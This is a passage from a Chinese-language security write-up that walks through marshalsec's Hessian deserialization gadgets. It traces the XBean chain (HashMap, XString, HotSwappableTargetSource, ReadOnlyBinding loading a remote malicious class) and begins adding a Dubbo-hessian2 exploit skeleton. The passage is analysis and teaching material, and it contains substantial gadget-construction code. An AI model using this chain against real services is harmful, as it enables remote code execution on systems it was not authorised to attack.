        UnicastRef(UnicastRefGadget.class),
        UnicastRemoteObject(UnicastRemoteObjectGadget.class),
        Groovy(Groovy.class),
        SpringPropertyPathFactory(SpringPropertyPathFactory.class),
        SpringPartiallyComparableAdvisorHolder(SpringPartiallyComparableAdvisorHolder.class),
        SpringAbstractBeanFactoryPointcutAdvisor(SpringAbstractBeanFactoryPointcutAdvisor.class),
        Rome(Rome.class),
        XBean(XBean.class),
        XBean2(XBean2.class),
        Resin(Resin.class),
        CommonsConfiguration(CommonsConfiguration.class),
        LazySearchEnumeration(LazySearchEnumeration.class),
        BindingEnumeration(BindingEnumeration.class),
        ServiceLoader(ServiceLoader.class),
        ImageIO(ImageIO.class),
        CommonsBeanutils(CommonsBeanutils.class),
        C3P0WrapperConnPool(C3P0WrapperConnPool.class),
        C3P0RefDataSource(C3P0RefDataSource.class),
        JdbcRowSet(JdbcRowSet.class),
        ScriptEngine(ScriptEngine.class),
        Templates(Templates.class),
        ResourceGadget(ResourceGadget.class),
        //
        ;
        private Class clazz;
        private GadgetType ( Class clazz ) {
            this.clazz = clazz;
        }
        /**
         * @return the clazz
         */
        public Class getClazz () {
            return this.clazz;
        }
    }
看出来了，就是个枚举类，那么前面遍历添加的时候执行的`t.getClazz().isAssignableFrom(this.getClass())`到底是根据什么去判断的呢，其实我们看回去上面，可以发现一个继承关系Hessian->HessianBase->MarshallerBase，而MarshallerBase是所有exploits的基类，而细心一点的读者，其实就已经发现了，其实在HessianBase这个类定义的地方可以看到，它实现了一些老接口，这部分接口其实就是它所支持的gadget，因此这里的判断就会成立，从而添加进来，以继续后续的doRun
    public abstract class HessianBase extends MarshallerBase
    implements 
    SpringPartiallyComparableAdvisorHolder,SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin
可以看到Hessian支持SpringPartiallyComparableAdvisorHolder,SpringAbstractBeanFactoryPointcutAdvisor,
Rome, XBean, Resin这几个gadget
跟进doRun：
    private void doRun ( GadgetType type, boolean test, boolean verbose, boolean throwEx, EscapeType escape, String[] gadgetArgs )
                throws Exception, IOException {
        T marshal;
        try {
            System.setSecurityManager(new SideEffectSecurityManager());
            Object o = createObject(type, expandArguments(gadgetArgs));
            if ( o instanceof byte[] || o instanceof String ) {
                // already marshalled by delegate
                @SuppressWarnings ( "unchecked" )
                T alreadyMarshalled = (T) o;
                marshal = alreadyMarshalled;
            }
            else {
                marshal = marshal(o);
            }
        }
        finally {
            System.setSecurityManager(null);
        }
        if ( !test || verbose ) {
            System.err.println();
            writeOutput(marshal, escape);
        }
        if ( test ) {
            System.err.println();
            System.err.println("Running gadget " + type + ":");
            test(marshal, throwEx);
        }
    }
可以看到在这个方法中，依次做了以下事情：
  1. 设置安全管理器
System.setSecurityManager(new SideEffectSecurityManager());
为什么这样做呢？其实是用来对权限的检查，在做特点权限事情的时候，进行抛异常，我的理解应该是以防payload生成的时候被触发了，然后本地执行了指令等等，会让我们误解是攻击成功等等...
  1. 创建payload对象
Object o = createObject(type, expandArguments(gadgetArgs));
    protected Object createObject ( GadgetType t, String[] args ) throws Exception {
        Method m = getTargetMethod(t);
        if ( !t.getClazz().isAssignableFrom(this.getClass()) ) {
            throw new Exception("Gadget not supported for this marshaller");
        }
        Args a = m.getAnnotation(Args.class);
        if ( a != null ) {
            if ( args.length  {
            return new HotSwappableTargetSource(x);
        });
    }
    public static Object makeToStringTrigger ( Object o, Function wrap ) throws Exception {
        String unhash = unhash(o.hashCode());
        XString xString = new XString(unhash);
        return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
    }
JDKUtil：
    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
以上就是XBean这个gadget所涉及的一些类，最终我们可以看到，其利用的是HashMap在反序列化时put数据从而触发gadget的执行
几个重点：
  * 在JDKUtil.makeMap中对HashMap进行反射设置数据进去，是为了避免执行put方法触发gadget
  * 在JDKUtil.makeMap中可以看到table这个字段设置的数组，存有两个元素，不过两个元素的hashCode是一样的，v1是HotSwappableTargetSource包装过的payload，v2是HotSwappableTargetSource包装的XString对象，而XString对象包装的也是payload
  * hessian反序列化HashMap时，因为会两次put同样hashCode的元素，从而触发key这个元素的equal方法
执行栈流程：
    getObjectInstance:319, NamingManager (javax.naming.spi)
    resolve:73, ContextUtil (org.apache.xbean.naming.context)
    getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)
    toString:192, Binding (javax.naming)
    equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    equals:104, HotSwappableTargetSource (org.springframework.aop.target)
    putVal:634, HashMap (java.util)
    put:611, HashMap (java.util)
    readMap:114, MapDeserializer (com.caucho.hessian.io)
    readMap:538, SerializerFactory (com.caucho.hessian.io)
    readObject:1160, HessianInput (com.caucho.hessian.io)
    public class HotSwappableTargetSource implements TargetSource, Serializable {
      //...
      public boolean equals(Object other) {
        return this == other || other instanceof HotSwappableTargetSource && this.target.equals(((HotSwappableTargetSource)other).target);
      }
      //...
    }
    public class XString extends XObject implements XMLString
    {
        //...
        public boolean equals(Object obj2)
        {
            if (null == obj2)
              return false;
              // In order to handle the 'all' semantics of
              // nodeset comparisons, we always call the
              // nodeset function.
            else if (obj2 instanceof XNodeSet)
              return obj2.equals(this);
            else if(obj2 instanceof XNumber)
                return obj2.equals(this);
            else
              return str().equals(obj2.toString());
        }
        //...
    }
    public class Binding extends NameClassPair {
        /...
        public String toString() {
            return super.toString() + ":" + getObject();
        }
        /...
    }
    public static final class ReadOnlyBinding extends Binding {
        public Object getObject() {
          try {
            return ContextUtil.resolve(this.value, this.getName(), (Name)null, this.context);
          } catch (NamingException var2) {
            throw new RuntimeException(var2);
          }
        }
    }
    public final class ContextUtil {
        public static Object resolve(Object value, String stringName, Name parsedName, Context nameCtx) throws NamingException {
        if (!(value instanceof Reference)) {
          return value;
        } else {
          Reference reference = (Reference)value;
          if (reference instanceof SimpleReference) {
            try {
              return ((SimpleReference)reference).getContent();
            } catch (NamingException var6) {
              throw var6;
            } catch (Exception var7) {
              throw (NamingException)(new NamingException("Could not look up : " + stringName == null ? parsedName.toString() : stringName)).initCause(var7);
            }
          } else {
            try {
              if (parsedName == null) {
                parsedName = NAME_PARSER.parse(stringName);
              }
              return NamingManager.getObjectInstance(reference, parsedName, nameCtx, nameCtx.getEnvironment());
            } catch (NamingException var8) {
              throw var8;
            } catch (Exception var9) {
              throw (NamingException)(new NamingException("Could not look up : " + stringName == null ? parsedName.toString() : stringName)).initCause(var9);
            }
          }
        }
      }
    }
  1. Hessian反序列化HashMap
  2. put反序列化的两个对象元素（HotSwappableTargetSource）至反序列化的HashMap，因为两个对象元素hashCode一致，所以执行其equals方法
  3. 其中一个对象元素是XString，XString的equals方法会执行其封装的对象ReadOnlyBinding的toString方法
  4. ReadOnlyBinding包装的对象是Reference引用对象，引用一个远程恶意class，当ReadOnlyBinding执行toString方法时，在其方法内会调用其getObject，从而加载远程恶意class执行
* * *
### 0x03 dubbo-hessian2 exploit骨架加入
上一章，我们简单的讲解了XBean这个gadget的触发原理，那么，这一章，我将会讲解如何在marshalsec里面加入dubbo的exploit。如果读过我写的[《dubbo源码浅析-默认反序列化利用之hessian2》](https://www.anquanke.com/post/id/197658)朋友，就会知道dubbo默认是使用了hessian2作为序列化和反序列化的工具，如果没看过的朋友，我希望你看到这里的时候可以花一丢丢时间去看看。
首先，我们如果要攻击一个dubbo服务，前提我们是得先找到这个dubbo服务的host和port，那么，我们加入这个dubbo-hessian2的exploit骨架，就得考虑参数化这些动态数据。
#### HessianBase
因为我们将要做的exploit只是加入XBean这个gadget的利用，所以，我们就不能继续沿用HessianBase了，因此，创建一个新的类HessianBase2，实现XBean接口，其余的代码和HessianBase保持一致
    public abstract class HessianBase2 extends MarshallerBase
            implements XBean {
        /**
         * {@inheritDoc}
         *
         * @see MarshallerBase#marshal(Object)
         */
        @Override
        public byte[] marshal ( Object o ) throws Exception {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            AbstractHessianOutput out = createOutput(bos);
            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            out.setSerializerFactory(sf);
            out.writeObject(o);
            out.close();
            return bos.toByteArray();
        }
        /**
         * {@inheritDoc}
         *
         * @see MarshallerBase#unmarshal(Object)
         */
        @Override
        public Object unmarshal ( byte[] data ) throws Exception {
            ByteArrayInputStream bis = new ByteArrayInputStream(data);
            AbstractHessianInput in = createInput(bis);
            return in.readObject();
        }